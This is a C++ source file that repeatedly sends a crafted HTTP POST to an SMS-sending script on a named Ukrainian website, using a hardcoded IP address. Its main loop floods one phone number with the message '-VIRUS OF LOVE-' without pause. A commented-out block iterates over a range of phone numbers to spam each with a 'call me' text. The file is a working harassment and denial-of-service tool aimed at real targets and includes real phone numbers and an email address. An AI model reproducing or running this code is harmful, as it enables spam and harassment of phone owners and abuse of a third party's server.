#include <iostream.h>
#include <stdio.h>
#include "client.h"

cclient client(true);

void observer(char * msg)
{
	char* buffer;
	long  size=strlen(msg);	

	buffer=new char[size+1];
	strcpy(buffer,msg);
	cout <<buffer<<endl;

	delete[] buffer;
}
 
void main()
{
	char request[]=
		"POST /ukr/sms.php? HTTP/1.0\r\n"
		"Host: www.jeans.com.ua\r\n"
		"User-Agent: Mozilla/3.0 (Compatible);metlinskiy@ua.fm\r\n"
		"Accept: Text/*, */*\r\n"
		"Content-Type: application/x-www-form-urlencoded\r\n"
		"Referer:\r\n"
		"Connection: keep-alive\r\n"
		"Content-Length: 74\r\n"
		"\r\n"
		"cmdSend=sent&Message=%2DVIRUS+OF+LOVE%2D&network1=JEANS&Phone1=2904509&=\r\n";

		//"Content-Length: 78\r\n"
		//"cmdSend=sent&Message=Pozvoni+mne+80502904509&network1=JEANS&Phone1=2888729&=\r\n";

//	char var[79];

	observer("press any key...");
	getchar();
	observer(request);

	while(true)
	{
		client._connect("212.113.36.204",80);
		client._sendex(request,strlen(request));
		client.stop();
		Sleep(0);
	}
/*
	for (unsigned int phone=2888729;phone<2904509;phone++)
	{
		int phone =2888729;
		wsprintf(var,"cmdSend=sent&Message=Pozvoni+mne+80502904509&network1=JEANS&Phone1=%d&=\r\n",phone);
		observer(var);
		getchar();

		client._connect("212.113.36.204",80);
		client._sendex(request,strlen(request));
		client._sendex(var,strlen(var));
		client.stop();

	}
*/
	getchar();
}